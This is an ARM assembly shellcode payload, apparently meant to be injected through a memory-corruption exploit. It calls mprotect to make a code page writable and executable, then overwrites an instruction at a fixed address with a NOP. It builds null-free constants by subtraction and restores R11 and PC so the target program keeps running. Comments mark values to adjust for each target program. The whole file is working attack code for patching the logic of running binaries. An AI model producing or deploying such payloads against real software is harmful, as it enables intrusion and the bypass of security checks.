.section .text
.global _start
_start:
 .ARM
 add   r3, pc, #1       // switch to thumb mode 
 bx    r3

.THUMB                  // Provide code segment read, write, execute permission
// mprotect(base_addr(0x00012000), len (2000), 7) 
 ldr   r0, =0x01112102  // =====*  1st parameter: set page-aligned address (0x000012000)
 ldr   r1, =0x01100102  // load to subtract the value (to get rid of 0x00)
 sub   r0, r0, r1
 ldr   r1, =#4200       // 2nd parameter: len
 mov   r2, #7           // 3rd parameter: permission type (all)
 mov   r7, #125         // system call value for mprotect()
 svc   #1               // execute

 add r3, #7             
 bx r3                  // return from thumb mode

.ARM 
 add   r3, pc, #1       // switch to thumb mode 
 bx    r3


.THUMB                  // Change instruction in code segment
// mov r0, r5             // r5 -> store last address of a function

 ldr r0, =0x0101317c    //=====* set location to change instruction
 ldr r1, =0x01000000
 sub r0, r0, r1

 ldr r1, =0xe1a01001    // Load NoP instruction
 str r1, [r0]           // set NoP instruction to addr of r0

 add r3, #7             // switch to normal mode
 bx r3

.ARM                    // restore R11, and PC value to continue program normally
 ADD R11, SP, #28       // =====* set r11 of caller function (maybe: 28 = 7 ldr * 4 bytes)    

 LDR R1, [PC, #20]      // load return address from exploit (20 -> depends on num of ldr) 
 SUB PC, R1, #0x01000000   // To adjust loaded return value in the exploit



# =====* -> value can be changed based on program

